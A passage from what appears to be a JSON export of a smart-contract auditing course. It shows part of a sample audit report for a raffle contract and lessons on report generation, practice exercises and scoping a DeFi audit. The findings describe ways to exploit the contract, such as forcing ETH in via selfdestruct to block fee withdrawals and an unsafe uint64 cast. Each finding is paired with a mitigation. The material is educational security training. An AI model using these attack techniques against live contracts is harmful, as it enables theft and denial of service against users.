Consider allowing duplicates. Users can make new wallet addresses anyways, so a duplicate check doesn't prevent the same person from entering multiple times, only the same wallet address.\n    2. Consider using a mapping to check duplicates. This would allow you to check for duplicates in constant time, rather than linear time. You could have each raffle have a `uint256` id, and the mapping would be a player address mapped to the raffle Id.\n\n    ```diff\n    +    mapping(address => uint256) public addressToRaffleId;\n    +    uint256 public raffleId = 0;\n        .\n        .\n        .\n        function enterRaffle(address[] memory newPlayers) public payable {\n            require(msg.value == entranceFee * newPlayers.length, \"PuppyRaffle: Must send enough to enter raffle\");\n            for (uint256 i = 0; i < newPlayers.length; i++) {\n                players.push(newPlayers[i]);\n    +            addressToRaffleId[newPlayers[i]] = raffleId;\n            }\n\n    -        // Check for duplicates\n    +       // Check for duplicates only from the new players\n    +       for (uint256 i = 0; i < newPlayers.length; i++) {\n    +          require(addressToRaffleId[newPlayers[i]] != raffleId, \"PuppyRaffle: Duplicate player\");\n    +       }\n    -        for (uint256 i = 0; i < players.length; i++) {\n    -            for (uint256 j = i + 1; j < players.length; j++) {\n    -                require(players[i] != players[j], \"PuppyRaffle: Duplicate player\");\n    -            }\n    -        }\n            emit RaffleEnter(newPlayers);\n        }\n    .\n    .\n    .\n        function selectWinner() external {\n    +       raffleId = raffleId + 1;\n            require(block.timestamp >= raffleStartTime + raffleDuration, \"PuppyRaffle: Raffle not over\");\n    ```\n\n    Alternatively, you could use [OpenZeppelin's `EnumerableSet` library](https://docs.openzeppelin.com/contracts/4.x/api/utils#EnumerableSet).\n\n    ### [M-2] Balance check on `PuppyRaffle::withdrawFees` enables griefers to selfdestruct a contract to send ETH to the raffle, blocking withdrawals\n\n    **Description:** The `PuppyRaffle::withdrawFees` function checks the `totalFees` equals the ETH balance of the contract (`address(this).balance`). Since this contract doesn't have a `payable` fallback or `receive` function, you'd think this wouldn't be possible, but a user could `selfdesctruct` a contract with ETH in it and force funds to the `PuppyRaffle` contract, breaking this check.\n\n    ```javascript\n        function withdrawFees() external {\n    @>      require(address(this).balance == uint256(totalFees), \"PuppyRaffle: There are currently players active!\");\n            uint256 feesToWithdraw = totalFees;\n            totalFees = 0;\n            (bool success,) = feeAddress.call{value: feesToWithdraw}(\"\");\n            require(success, \"PuppyRaffle: Failed to withdraw fees\");\n        }\n    ```\n\n    **Impact:** This would prevent the `feeAddress` from withdrawing fees. A malicious user could see a `withdrawFee` transaction in the mempool, front-run it, and block the withdrawal by sending fees.\n\n    **Proof of Concept:**\n\n    1. `PuppyRaffle` has 800 wei in it's balance, and 800 totalFees.\n    2. Malicious user sends 1 wei via a `selfdestruct`\n    3. `feeAddress` is no longer able to withdraw funds\n\n    **Recommended Mitigation:** Remove the balance check on the `PuppyRaffle::withdrawFees` function.\n\n    ```diff\n        function withdrawFees() external {\n    -       require(address(this).balance == uint256(totalFees), \"PuppyRaffle: There are currently players active!\");\n            uint256 feesToWithdraw = totalFees;\n            totalFees = 0;\n            (bool success,) = feeAddress.call{value: feesToWithdraw}(\"\");\n            require(success, \"PuppyRaffle: Failed to withdraw fees\");\n        }\n    ```\n\n    ### [M-3] Unsafe cast of `PuppyRaffle::fee` loses fees\n\n    **Description:** In `PuppyRaffle::selectWinner` their is a type cast of a `uint256` to a `uint64`. This is an unsafe cast, and if the `uint256` is larger than `type(uint64).max`, the value will be truncated.\n\n    ```javascript\n        function selectWinner() external {\n            require(block.timestamp >= raffleStartTime + raffleDuration, \"PuppyRaffle: Raffle not over\");\n            require(players.length > 0, \"PuppyRaffle: No players in raffle\");\n\n            uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;\n            address winner = players[winnerIndex];\n            uint256 fee = totalFees / 10;\n            uint256 winnings = address(this).balance - fee;\n    @>      totalFees = totalFees + uint64(fee);\n            players = new address[](0);\n            emit RaffleWinner(winner, winnings);\n        }\n    ```\n\n    The max value of a `uint64` is `18446744073709551615`. In terms of ETH, this is only ~`18` ETH. Meaning, if more than 18ETH of fees are collected, the `fee` casting will truncate the value.\n\n    **Impact:** This means the `feeAddress` will not collect the correct amount of fees, leaving fees permanently stuck in the contract.\n\n    **Proof of Concept:**\n\n    1. A raffle proceeds with a little more than 18 ETH worth of fees collected\n    2. The line that casts the `fee` as a `uint64` hits\n    3. `totalFees` is incorrectly updated with a lower amount\n\n    You can replicate this in foundry's chisel by running the following:\n\n    ```javascript\n    uint256 max = type(uint64).max\n    uint256 fee = max + 1\n    uint64(fee)\n    // prints 0\n    ```\n\n    **Recommended Mitigation:** Set `PuppyRaffle::totalFees` to a `uint256` instead of a `uint64`, and remove the casting. Their is a comment which says:\n\n    ```javascript\n    // We do some storage packing to save gas\n    ```\n    But the potential gas saved isn't worth it if we have to recast and this bug exists.\n\n    ```diff\n    -   uint64 public totalFees = 0;\n    +   uint256 public totalFees = 0;\n    .\n    .\n    .\n        function selectWinner() external {\n            require(block.timestamp >= raffleStartTime + raffleDuration, \"PuppyRaffle: Raffle not over\");\n            require(players.length >= 4, \"PuppyRaffle: Need at least 4 players\");\n            uint256 winnerIndex =\n                uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;\n            address winner = players[winnerIndex];\n            uint256 totalAmountCollected = players.length * entranceFee;\n            uint256 prizePool = (totalAmountCollected * 80) / 100;\n            uint256 fee = (totalAmountCollected * 20) / 100;\n    -       totalFees = totalFees + uint64(fee);\n    +       totalFees = totalFees + fee;\n    ```\n\n    ### [M-4] Smart Contract wallet raffle winners without a `receive` or a `fallback` will block the start of a new contest\n\n    **Description:** The `PuppyRaffle::selectWinner` function is responsible for resetting the lottery. However, if the winner is a smart contract wallet that rejects payment, the lottery would not be able to restart.\n\n    Non-smart contract wallet users could reenter, but it might cost them a lot of gas due to the duplicate check.\n\n    **Impact:** The `PuppyRaffle::selectWinner` function could revert many times, and make it very difficult to reset the lottery, preventing a new one from starting.\n\n    Also, true winners would not be able to get paid out, and someone else would win their money!\n\n    **Proof of Concept:**\n    1. 10 smart contract wallets enter the lottery without a fallback or receive function.\n    2. The lottery ends\n    3. The `selectWinner` function wouldn't work, even though the lottery is over!\n\n    **Recommended Mitigation:** There are a few options to mitigate this issue.\n\n    4. Do not allow smart contract wallet entrants (not recommended)\n    5. Create a mapping of addresses -> payout so winners can pull their funds out themselves, putting the owness on the winner to claim their prize. (Recommended)\n\n    ## Informational / Non-Critical\n\n    ### [I-1] Floating pragmas\n\n    **Description:** Contracts should use strict versions of solidity. Locking the version ensures that contracts are not deployed with a different version of solidity than they were tested with. An incorrect version could lead to uninteded results.\n\n    https://swcregistry.io/docs/SWC-103/\n\n    **Recommended Mitigation:** Lock up pragma versions.\n\n    ```diff\n    - pragma solidity ^0.7.6;\n    + pragma solidity 0.7.6;\n    ```\n\n    ### [I-2] Magic Numbers\n\n    **Description:** All number literals should be replaced with constants. This makes the code more readable and easier to maintain. Numbers without context are called \"magic numbers\".\n\n    **Recommended Mitigation:** Replace all magic numbers with constants.\n\n    ```diff\n    +       uint256 public constant PRIZE_POOL_PERCENTAGE = 80;\n    +       uint256 public constant FEE_PERCENTAGE = 20;\n    +       uint256 public constant TOTAL_PERCENTAGE = 100;\n    .\n    .\n    .\n    -        uint256 prizePool = (totalAmountCollected * 80) / 100;\n    -        uint256 fee = (totalAmountCollected * 20) / 100;\n            uint256 prizePool = (totalAmountCollected * PRIZE_POOL_PERCENTAGE) / TOTAL_PERCENTAGE;\n            uint256 fee = (totalAmountCollected * FEE_PERCENTAGE) / TOTAL_PERCENTAGE;\n    ```\n\n    ### [I-3] Test Coverage\n\n    **Description:** The test coverage of the tests are below 90%. This often means that there are parts of the code that are not tested.\n\n    ```\n    | File                               | % Lines        | % Statements   | % Branches     | % Funcs       |\n    | ---------------------------------- | -------------- | -------------- | -------------- | ------------- |\n    | script/DeployPuppyRaffle.sol       | 0.00% (0/3)    | 0.00% (0/4)    | 100.00% (0/0)  | 0.00% (0/1)   |\n    | src/PuppyRaffle.sol                | 82.46% (47/57) | 83.75% (67/80) | 66.67% (20/30) | 77.78% (7/9)  |\n    | test/auditTests/ProofOfCodes.t.sol | 100.00% (7/7)  | 100.00% (8/8)  | 50.00% (1/2)   | 100.00% (2/2) |\n    | Total                              | 80.60% (54/67) | 81.52% (75/92) | 65.62% (21/32) | 75.00% (9/12) |\n    ```\n\n    **Recommended Mitigation:** Increase test coverage to 90% or higher, especially for the `Branches` column.\n\n    ### [I-4] Zero address validation\n\n    **Description:** The `PuppyRaffle` contract does not validate that the `feeAddress` is not the zero address. This means that the `feeAddress` could be set to the zero address, and fees would be lost.\n\n    ```\n    PuppyRaffle.constructor(uint256,address,uint256)._feeAddress (src/PuppyRaffle.sol#57) lacks a zero-check on :\n                    - feeAddress = _feeAddress (src/PuppyRaffle.sol#59)\n    PuppyRaffle.changeFeeAddress(address).newFeeAddress (src/PuppyRaffle.sol#165) lacks a zero-check on :\n                    - feeAddress = newFeeAddress (src/PuppyRaffle.sol#166)\n    ```\n\n    **Recommended Mitigation:** Add a zero address check whenever the `feeAddress` is updated.\n\n    ### [I-5] _isActivePlayer is never used and should be removed\n\n    **Description:** The function `PuppyRaffle::_isActivePlayer` is never used and should be removed.\n\n    ```diff\n    -    function _isActivePlayer() internal view returns (bool) {\n    -        for (uint256 i = 0; i < players.length; i++) {\n    -            if (players[i] == msg.sender) {\n    -                return true;\n    -            }\n    -        }\n    -        return false;\n    -    }\n    ```\n\n    ### [I-6] Unchanged variables should be constant or immutable\n\n    Constant Instances:\n    ```\n    PuppyRaffle.commonImageUri (src/PuppyRaffle.sol#35) should be constant\n    PuppyRaffle.legendaryImageUri (src/PuppyRaffle.sol#45) should be constant\n    PuppyRaffle.rareImageUri (src/PuppyRaffle.sol#40) should be constant\n    ```\n\n    Immutable Instances:\n\n    ```\n    PuppyRaffle.raffleDuration (src/PuppyRaffle.sol#21) should be immutable\n    ```\n\n    ### [I-7] Potentially erroneous active player index\n\n    **Description:** The `getActivePlayerIndex` function is intended to return zero when the given address is not active. However, it could also return zero for an active address stored in the first slot of the `players` array. This may cause confusions for users querying the function to obtain the index of an active player.\n\n    **Recommended Mitigation:** Return 2**256-1 (or any other sufficiently high number) to signal that the given player is inactive, so as to avoid collision with indices of active players.\n\n    ### [I-8] Zero address may be erroneously considered an active player\n\n    **Description:** The `refund` function removes active players from the `players` array by setting the corresponding slots to zero. This is confirmed by its documentation, stating that \"This function will allow there to be blank spots in the array\". However, this is not taken into account by the `getActivePlayerIndex` function. If someone calls `getActivePlayerIndex` passing the zero address after there's been a refund, the function will consider the zero address an active player, and return its index in the `players` array.\n\n    **Recommended Mitigation:** Skip zero addresses when iterating the `players` array in the `getActivePlayerIndex`. Do note that this change would mean that the zero address can _never_ be an active player. Therefore, it would be best if you also prevented the zero address from being registered as a valid player in the `enterRaffle` function.\n\n    ## Gas\n\n    ### [G-2] Storage Variables in a Loop Should be Cached\n\n    Everytime you call `players.length` you read from storage, as opposed to memory which is more gas efficient.\n\n    ```diff\n    + uint256 playersLength = players.length;\n    - for (uint256 i = 0; i < players.length - 1; i++) {\n    + for (uint256 i = 0; i < playersLength - 1; i++) {\n    -    for (uint256 j = i + 1; j < players.length; j++) {\n    +    for (uint256 j = i + 1; j < playersLength; j++) {\n        require(players[i] != players[j], \"PuppyRaffle: Duplicate player\");\n    }\n    }\n    ```\n    ### [G-1] Unchanged state variables should be declared constant or immutable\n\n    Reading from storage is much more expensive than reading a constant or immutable variable.\n\n    Instances:\n\n    - `PuppyRaffle::raffleDuration` should be `immutable`\n    - `PuppyRaffle::commonImageUri` should be `constant`\n    - `PuppyRaffle::rareImageUri` should be `constant`\n    - `PuppyRaffle::legendaryImageUri` should be `constant`\n\n</details>\n\n---\n\nThe final step, once the template has been filled out is to run our CLI command\n\n```bash\npandoc report-formatted.md -o report.pdf --from markdown --template=eisvogel --listings\n```\n\n### Wrap Up\n\nAnd with that - you should have a PHENOMENAL audit report to add to your security portfolio! The very next thing you need to do is add this PDF to the GitHub repository you made in the previous section. Tracking your progress and cataloging your experience is how you'll get your name out there and show the world what you know. Even audit firms like Cyfrin do this!\n\nHuge congratulations, let's bring this section home!\n\n---\n\nSimilarly to the previous PDF generating lesson, I'll include some common pitfalls and solutions you can reference here, should you run into issues in this process.\n\n<details>\n<summary>Errors/Issues</summary>\n\n1. **My home/root directory doesn't have a `.pandoc` file!**\n\n   - Depending on your operating system, this file may exist elsewhere. If you're using WSL/Linux keep a few things in mind\n\n     - The file may be hidden - files prepended with `.` are often hidden. You can reveal all files in a directory with the command `ls -a`\n     - The file may be elsewhere - navigate back in directories (`cd ..`) until you reach one that looks like this\n\n     <img src=\"/security-section-3/28-making-a-pdf/making-a-pdf1.png\" style=\"width: 75%; height: auto;\">\n\n     ...from here navigate to `usr/share/pandoc/data/templates`. In here you will find existing templates and this is where `eisvogel.latex` should be added.\n\n2. **VS Code says I'm _unable to write a file to that directory_!**\n\n   - This is related to your user permissions, we can force the file to be created with a sudo command. `sudo touch eisvogel.latex` - this command will create a file named `eisvogel.latex` in your current directory.\n     - You may be prompted to enter your credentials or need to create an admin user.\n\n3. **VS Code says I'm _unable to write to eisvogel.latex_!**\n\n   - Similarly to above, this is permissions related. The easiest work around I found was through another `sudo` command.\n     ```bash\n     sudo tee eisvogel.latex << 'EOF'\n     [copy LaTex here]\n     EOF\n     ```\n   - The LaTex you need to copy is available [**here**](https://github.com/Cyfrin/audit-report-templating/blob/main/eisvogel.latex). Yes, you will be pasting 1068 lines into your terminal - this will overwrite your `eisvogel.latex` file, in your current directory, with that copied data.\n\n4. **When I run `pandoc report.md -o ... etc` I get _File Not Found_**\n\n   - This seems caused when our LaTex package is missing an important element. The easiest solution is to assure we have the full distribution of the package we're using. For WSL users `sudo apt install texlive-full` will resolve these errors.\n     - Note: `texlive-full` is 5.6GB in size.\n\n5. **When I run `pandoc report.md -o ... etc` I get _Missing number, treated as zero_**\n\n   - Caused by an error in the LaTex syntax either in your markdown using it, or the template itself. Replace the block of LaTeX at the top of your `report.md` file with the following:\n\n   ```\n    \\begin{titlepage}\n    \\centering\n    {\\Huge\\bfseries Protocol Audit Report\\par}\n    \\vspace{2cm}\n    \\begin{figure}[h]\n    \\centering\n    \\includegraphics[width=0.5\\textwidth]{logo.pdf}\n    \\end{figure}\n    \\vspace{2cm}\n    {\\Large Version 1.0\\par}\n    \\vspace{1cm}\n    {\\Large\\itshape equious.eth\\par}\n    \\vfill\n    {\\large \\today\\par}\n    \\end{titlepage}\n   ```\n\n   This should resolve the error.\n",
          "updates": []
        },
        {
          "lessonId": "a94fec74-bad9-491f-bf90-8e96ceeb6f83",
          "number": 64,
          "title": "Exercises",
          "slug": "exercises",
          "folderName": "64-exercises",
          "description": "",
          "duration": 5,
          "videoUrl": "3IfZwGlsO9K02LUDgAaSb8jsnUltDsV7MifMH8qCe7V8",
          "rawMarkdownUrl": "/routes/security/4-puppy-raffle/64-exercises/+page.md",
          "markdownContent": "---\ntitle: Exercises\n---\n\n_Follow along with this video:_\n\n---\n\n### Exercises\n\nThis has easily been my favourite auditing codebase. We've come a long way and now is a great time to take a break and feed that ice cream addiction.\n\nWhen you're ready we've got much more for you to dive into to sharpen your skills and further familiarize yourself with the vulnerabilities we've discussed in this section.\n\nNavigate to [**sc-exploits-minimized**](https://github.com/Cyfrin/sc-exploits-minimized) repo.\n\nIn the same area of this repo where we'd reference our simplified Remix examples, we've additional sections available to you, including `Ethernaut`, `Damn Vulnerable DeFi` and `Case Studies`. These are invaluable resources to challenge yourself and learn more about the security eco-system in Web3.\n\n### Ethernaut\n\nEthernaut, is amazing. It's effectively a compilation of CTFs (capture the flags) or games where you learn about how to exploit various vulnerabilities in a semi-live environment. There are dozens of challenges to complete. I highly recommend starting with `Hello Ethernaut` as it will outline the basics of how Ethernaut works and how to play.\n\nYou _are_ expected to know a little bit of JavaScript for some of the functionality of `Ethernaut`, but with a little work you can deploy the instanced contracts and interact with them through `Foundry` or `Etherscan` as well.\n\n<img src=\"/security-section-4/64-exercises/exercises1.png\" width=\"75%\" height=\"auto\">\n\n### Damn Vulnerable DeFi\n\nI also would encourage you to check out [**Damn Vulnerable Defi**](https://www.damnvulnerabledefi.xyz/), which has a number of similar challenges. I'll warn you that DVD _is_ a bit more challenging than `Ethernaut`\n\nUnfortunately DVD is _also_ written in `Hardhat`, so some JavaScript knowledge goes a long way.\n\n> **Note:** Someone needs to rewrite this in Foundry!!!\n\nWhat you can do, if you're not comfortable with `Hardhat` would be to copy the contracts that Damn Vulnerable Defi provides you into a Forge project and just try to break it locally. Each challenge in DVD provides you with your objectives.\n\n<img src=\"/security-section-4/64-exercises/exercises2.png\" width=\"75%\" height=\"auto\">\n\n### Case Studies\n\nThis section, of course, offers some case study examples of the vulnerabilities we've been discussing so you can gain further insight into how impactful these issues have been and how they've affected the ecosystem beyond all the theory - in the real world.\n\n---\n\nBeyond the above, we've got **even more** for you to do to practice all you've learnt in this section.\n\n1. [**Ethernaut Challenges**](https://ethernaut.openzeppelin.com/) (1, 9 & 10)\n2. Sign up for [**Solodit**](https://solodit.xyz/)\n3. Post a tweet about how you completed the Puppy Raffle Audit!\n4. Sign up for [**Farcaster**](https://www.farcaster.xyz/)\n5. Do a [**CodeHawks First Flight**](https://www.codehawks.com/first-flights)\n\nðŸ§‘â€ðŸš€ðŸ§‘â€ðŸš€ðŸ§‘â€ðŸš€ðŸ§‘â€ðŸš€ðŸ§‘â€ðŸš€ðŸ§‘â€ðŸš€ðŸ§‘â€ðŸš€ðŸ§‘â€ðŸš€ðŸ§‘â€ðŸš€ðŸ§‘â€ðŸš€ðŸ§‘â€ðŸš€ðŸ§‘â€ðŸš€ðŸ§‘â€ðŸš€ðŸ§‘â€ðŸš€ðŸ§‘â€ðŸš€ðŸ§‘â€ðŸš€ðŸ§‘â€ðŸš€ðŸ§‘â€ðŸš€ðŸ§‘â€ðŸš€ðŸ§‘â€ðŸš€ðŸ§‘â€ðŸš€ðŸ§‘â€ðŸš€\n\n### Section 4 NFT Challenges\n\n- [**A combination hack (Arb)**](https://arbiscan.io/address/0xef72ba6575b86beaa9b9e4a78bca4a58f3cce276)\n- [**A combination hack (Sepolia)**](https://sepolia.etherscan.io/address/0xf988ebf9d801f4d3595592490d7ff029e438deca)\n",
          "updates": []
        },
        {
          "lessonId": "245558bd-9ab1-4fb1-a429-07d8623e5d3c",
          "number": 65,
          "title": "Solodit",
          "slug": "solodit",
          "folderName": "65-solodit",
          "description": "",
          "duration": 4,
          "videoUrl": "DzlS01Ier56kx009IsB2DaS00m1LPW4HypELxUegm878gI",
          "rawMarkdownUrl": "/routes/security/4-puppy-raffle/65-solodit/+page.md",
          "markdownContent": "---\ntitle: Solodit\n---\n\n_Follow along with this video:_\n\n---\n\n### Level Up Your Security Game with Solodit\n\nAnybody who aims to excel in competitive audits and enhance their grasp of Web3 security should pay attention. The secret tool you need to get an edge? It's called [**Solodit**](https://solodit.xyz/).\n\nThe legendary [**Hans Friese**](https://twitter.com/hansfriese?lang=en) Was the #1 competitive auditor by earnings for the first half of 2023 with over $100,000 won.\n\nWhen asked for advice on how he performs so well, he says one of the most beneficial things he does is reading the reports of other auditors.\n\nThus [**Solodit**](https://solodit.xyz/) was born. [**Solodit**](https://solodit.xyz/) aggregates publicly available security reports from across the industry into a single convenient aveneue to search and sort through.\n\nOnce logged in you should see something like this, a clean UI through which you can search and filter by anything you'd like.\n\n<img src=\"/security-section-4/65-solodit/solodit1.png\" width=\"75%\" height=\"auto\">\n\nBy navigating to the [**`Audits` menu**](https://solodit.xyz/audit), we can even see live and upcoming audit competitions as well as learn about types of audits such as the Multi-Phase Audit.\n\n<img src=\"/security-section-4/65-solodit/solodit2.png\" width=\"75%\" height=\"auto\">\n\nIn addition to this, Solodit aggregates open `bug bounties` as well as `leaderboard` positions across multiple auditing platforms.\n\nThere's even a notes section, to allow you to jot down your thoughts on your findings, or the findings of other people.\n\n[**Solodit**](https://solodit.xyz/) truly is the `one-stop-shop` for security researchers.\n\n### Wrap Up\n\nBecoming a successful security researcher or a leading smart contract developer requires continuous learning. Solodit provides a unique platform that allows you to effortlessly learn, compete, and evolve as a professional in the sector. Consider it as your personal go-to learning and resource tool for staying abreast of industry developments. If you aspire to lead in the world of smart contract security, signing up for Solodit is a no-brainer.\n",
          "updates": []
        },
        {
          "lessonId": "a5810a91-3839-4aa1-8bc3-f235e17d4ff8",
          "number": 66,
          "title": "Wrapping Up",
          "slug": "wrapping-up",
          "folderName": "66-wrapping-up",
          "description": "",
          "duration": 2,
          "videoUrl": "MiGd85HXLxSy005IARKrGHD01AXme01v7mfDwFreMctCYQ",
          "rawMarkdownUrl": "/routes/security/4-puppy-raffle/66-wrapping-up/+page.md",
          "markdownContent": "---\ntitle: Wrapping Up\n---\n\n_Follow along with this video:_\n\n---\n\n### Celebrate Your Wins\n\nThe very next thing you should do is post a tweet celebrating how far you've come and flexing how much you've learnt to the community.\n\n![](https://cdn.videotap.com/IWZnrLvTfiL85XHWN2bU-13.04.png)\n\nGo ahead and share your success on Twitter. There's no better way to share the news than a straightforward, cheerful tweet. If you're not sure how to compose your tweet, don't worry. I got you covered.\n\n[**Clicking this will auto-generate a tweet for you to share your success!**](https://twitter.com/intent/tweet?text=I%20just%20completed%20the%20%40cyfrinaudits%20Puppy%20Raffle%20%F0%9F%90%B6%20Audit%20from%20the%20Ultimate%20Security%20Course.%0a%0aThanks%20%40patrickalphac!)\n\n> \"Celebrating your wins publicly not only helps you keep track of your progress but also encourages others to keep going.\"\n\n### Farcaster: Web3 Social Media\n\nYou might also be interested in a more Web3 focused social media, if so I'd recommend checking out [Farcaster](https://www.farcaster.xyz/) to find like-minded researches and connect!\n\n### CodeHawks First Flights\n\nWith two practice audits under your belt, I highly recommend participating in a [**CodeHawks First Flight**](https://www.codehawks.com/first-flights). These events are made specifically for someone like you, someone who wants to get their feet wet with easier/quicker competitive audits and gain some real experience.\n\n.. If you're feeling really confident, you may even want to try a _real_ competitive audit!\n\nNow's a great time to pause the course and participate in whichever First Flight is active, a new one starts every 2 weeks!\n\n### Commend Yourself for The Milestone Achieved\n\nRegardless of what you choose to do next, take a moment to pat yourself on the back. You've made it this far and it's no small feat. You've gotten a feel for what it's like to be a security researcherâ€”diving into code bases, writing reports, looking for vulnerabilities, and spotting potential bugs based on past experiences.\n\nRemember, in this field, repetition is the mother of skill. The more audits you carry out, the more skilled you will become.\n\n```js\nconsole.log(\n  \"Congratulations on getting this far! Now, go enjoy some ice cream.\"\n);\n```\n\nTake that break, because in Section 5 the training wheels come off with `TSwap`, we're going to jump into Invariants, Fuzzing, Advanced DeFi and more.\n\nCongratulations again, and I'll see you in Section 5!\n\nðŸ¸\n",
          "updates": []
        }
      ]
    },
    {
      "number": 5,
      "sectionId": "a5e8a426-8db9-4b0e-934e-6dfdabf202c4",
      "title": "TSwap",
      "slug": "tswap",
      "folderName": "5-tswap",
      "lessons": [
        {
          "lessonId": "e420cca9-92f8-48e4-ae32-33c55034fed8",
          "number": 1,
          "title": "Introduction",
          "slug": "introduction",
          "folderName": "1-introduction",
          "description": "",
          "duration": 5,
          "videoUrl": "Ummg02Io4mqR02gbE02Ajd00mbtRSWF02QgiDuuVqEd500gF00",
          "rawMarkdownUrl": "/routes/security/5-tswap/1-introduction/+page.md",
          "markdownContent": "---\ntitle: Introduction\n---\n\n_Follow along with this video:_\n\n\n\n---\n\n# Unveiling Invariance and DeFi in Security Auditing: An Interactive Exploration\n\nHappy to have you back in the exciting world of Security and Auditing. So, youâ€™ve made it through the delightful puppy raffle, you have ideally signed up for Codeox and might have sprung into your first few flights or even explored a contest. That's awesome! You'd certainly be exuding more confidence about your security and auditing journey. But there's a lot more to unfold and absorb.\n\n## Entering Section Five: Invariance and Introduction to DFI T-SWAP Audit\n\nIn our detailed Git repo related to this course, when you scroll down, Section Five, Invariance and Introduction to DFI TSWAP Audit, will catch your attention. Making your journey a slight bit more interesting this time, we are moving onto another walkthrough security review. This time around, we will approach the task differently.\n\n![](https://cdn.videotap.com/y4z5tLc5N9gtADQGQSGP-43.5.png)\n\n## A Glimpse of Whatâ€™s to Come\n\nDo not rush into the contracts yet, thereâ€™s plenty to learn before that! We will cover a lot in this section, a prime focus will be on 'Invariance'. Though we've touched upon invariants in the Foundry Course, we never really delved into their significance, and when it comes to security, that's when you realize how crucial they are.\n\nAs a budding security researcher, itâ€™s critical to understand and appreciate the weight that invariance carries. You'll learn to identify bugs without even looking at the code in-depth. Of course, this shouldn't be your only strategy in a security review, but through this session, we're demonstrating how critical and potent it can be.\n\nWe will be wielding an array of powerful tools, such as stateful fuzzing and fuzzing invariance. If youâ€™re unfamiliar with freepy, don't worry, we will explore that as well.\n\n![](https://cdn.videotap.com/vxJBy007OWXoaJWFjk6V-97.88.png)\n\n## Dive Deeper into DeFi\n\nDeFi experienced a surge in popularity recently. For those unfamiliar, DeFi, or decentralized finance, refers to financial services that are available on a public decentralized blockchain network. It eliminates the need for intermediaries and allows for a more open financial system.\n\nDespite the intricacy, DeFi is relatively straightforward to grasp. With patience and perseverance, you will understand it. It's a concept that can seem daunting initially due to the complex terms used. In reality, most of the concepts are based on basic math.\n\nWe will dissect the Uniswap Protocol or the T swap protocol, a Decentralized Exchange in DeFi, and demystify it for better understanding. As we dive into the security review, we will use a myriad of robust tools to hack into the system.\n\n> \"A little progress each day adds up to big results.\"\n\nThis quote embodies the essence of our entire journey here. By the end of this section, you will have practically audited an entire Uniswap V1 in the audit data folder.\n\n![](https://cdn.videotap.com/v1Dx6md72HKpatpU5PgM-195.75.png)\n\n## A Bag Full of Exploits and Tooling\n\nAfter diving under the hood of DeFi, we're going to learn a slew of new hacking techniques and tools. These include exploring esteemed toolkits like Echidna Foundry, examining concepts like consensus mutation testing and differential testing, and studying properties and exploits such as Weird ERC-20s callbacks, rebates, reentries, and core invariant breakings.\n\nThe prime focus for this session will be on understanding DFI and Invariance. Roughly going to the end of this section, you will have the experience of practically auditing the first-ever Uniswap created (Uniswap V1), commodities with a few of the bugs that I stumbled into during my journey.\n\n## Get Set Go!\n\nWith everything I've shared with you, brace yourself for a thrilling juncture in Security and Auditing. Let's put on our thinking caps, get our VS code and popcorn ready, and dive right into T Swap. Together, we will crack the code and delve deeper into the world of DeFi.\n",
          "updates": []
        },
        {
          "lessonId": "8cd1ab7c-5005-41ec-93c7-86d7fb7b41a0",
          "number": 2,
          "title": "Phase 1: Scoping",
          "slug": "phase-1-scoping",
          "folderName": "2-phase-1-scoping",
          "description": "",
          "duration": 9,
          "videoUrl": "J8keCLBxWY01ckQQmpl5LPqZ3X02HRwwjly6IL3u4l4VM",
          "rawMarkdownUrl": "/routes/security/5-tswap/2-phase-1-scoping/+page.md",
          "markdownContent": "---\ntitle: Phase 1 - Scoping\n---\n\n_Follow along with this video:_\n\n\n\n---\n\n## Cloning the Repo\n\nFirst things first, let's clone the repository into our security course directory as usual. Opening the repository link in a new tab, we copy the URL and perform a standard `git clone`. Let's paste this into our command line\n\n```bash\ngit clone https://github.com/Cyfrin/5-t-swap-audit\n```\n\nThis opens the 5 TSWAP audit into its own unique folderâ€”an essential process for good workflow and code organization. To verify that all is well and we are on the correct branch, we run `git branch`.\n\nAs expected, we are on the main branch. This serves as our starting point for this eye-opening security review.\n\n![](https://cdn.videotap.com/3aVlKcGZ2t6Didb1YvL3-95.09.png)\n\n## Extensive Onboarding: Why It's Key\n\nAs we revisit the well-known Puppy Raffle, whose initial setup used basic onboarding, we delve into the importance of extensive onboarding, particularly for a TSWAP audit.\n\nThrough this review, you'll realize why taking the time to answer extensive onboarding questions is so crucial. The information collected in this process becomes a treasure trove for any security reviewâ€”more so if questions are as painstakingly detailed as possible. That's why you want to gather as much information as possible, get your fingers everywhere credible!\n\n## Gathering the Important Data\n\nOur onboarding sheet collects basic information such as the website URL, which could have a wealth of information. It also enforces the absolute necessity of associated documentationâ€”a critical pillar for achieving any successful code review.\n\nFor our TSWAP audit, the README file plays a pivotal role as our most accessible source of documentation. We also capture the point of contact, white paper, and commit hash.\n\nOn a regular audit, we'd swap branches to the commit hash to ensure we're working on an identical codebase through the command `git checkout \"[paste commit hash here]\"`. In this tutorial, however, we'll stick with the main branch.\n\n## Checking Codebase Size and Interactions\n\nOur TSWAP repository has two contracts in scope: Pool Factory and TSWAP. A scroll through the SRC shows that these are the only contracts in action, with a SLOC (Source Lines of Code) of 374. This figure, being double the size of our previous Puppy Raffle review, gives us a mental image of review duration based on code length and complexity.\n\nWe head into uncharted waters with a crucial question: How many external protocols does the code interact with? Though new to this discourse, you'll discover the answer's importance in due course.\n\n## Test Coverage: A Total Nightmare\n\nA cursory look at the test coverage (a dismal 41%) sets off alarm bells. By delving into the README file and running `make` on our command-line interfaceâ€”watching as it triggers installationsâ€”we can see the extent of the test coverageâ€”the bedrock of any software project.\n\n![](https://cdn.videotap.com/CsI8uiOgGgscAECYBaRW-297.16.png)After a round of `forge coverage`, we cringe at the test coverage results. A low coverage figure, such as the 40% and 37% for functions and branches respectively that we are staring at, is a bright red flag for bugs galore!\n\nOnce this alarming discovery is made, we must revert to the main branch using the commands `git stash` and `git checkout main`. We must also run `make` to commence another series of installations.\n\nNo sooner are these installations done that we return to businessâ€”our comprehensive onboarding documentation.\n\n## Scope, Scope File and Building Protocol Context\n\nOur review scope is now clear: the Pool Factory and TSWAP. With commands `make scope`, and `make scope file` we generate an output and file that are incredibly compatible with pandocâ€”a documentation generation tool we love.\n\nNow that the scope is clarified, we delve deeper into protocol understanding. Here, we ask questions like whether the project is a fork of an existing protocol, or if it uses rollups. Such queries, though seemingly unrelated to the immediate task, bear great significance later in the course.\n\nIn our case, our protocol is a new standalone rather than a fork of an existing one (Uniswap V1 for this instance). It doesn't use rollups or have multi-chain 